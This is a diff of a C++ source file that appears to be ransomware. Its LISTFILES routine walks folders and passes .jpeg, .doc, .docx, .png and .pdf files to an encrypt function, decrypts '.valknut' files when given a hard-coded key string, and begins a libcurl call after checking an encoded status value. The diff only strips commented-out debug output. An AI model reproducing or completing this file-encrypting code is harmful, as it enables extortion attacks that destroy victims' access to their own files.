@@ -43,12 +43,12 @@ void LISTFILES(std::string path,string opt) {
                         entry.path().extension().string() == ".jpeg" || entry.path().extension().string() == ".doc" ||
                         entry.path().extension().string() == ".docx" || entry.path().extension().string() == ".png" ||
                         entry.path().extension().string() == ".pdf") {
-                        //cout << entry.path() << '\n';
+
                         ENCRYPT_FUNCTION(entry.path().string());
                     }
                 }else if(opt=="rwZuteXiobFR3dwL"){
                     if(entry.path().extension().string()==".valknut"){
-                        //cout << entry.path() << '\n';
+
                         DECRYPT_FUNCTION(entry.path().string());
                     }
                 }
@@ -59,7 +59,7 @@ void LISTFILES(std::string path,string opt) {
         }
     }
     catch (fs::filesystem_error const& ex) {
-       // cout << ex.what();
+
 
 
     }
@@ -69,7 +69,7 @@ void LISTFILES(std::string path,string opt) {
 
 void checkStatus(string status, HWND hWnd,string path){
     if (status == "626d397962574673") {
-        //ENCRYPT_FUNCTION();
+
         CURL *curl;
         CURLcode res;
 
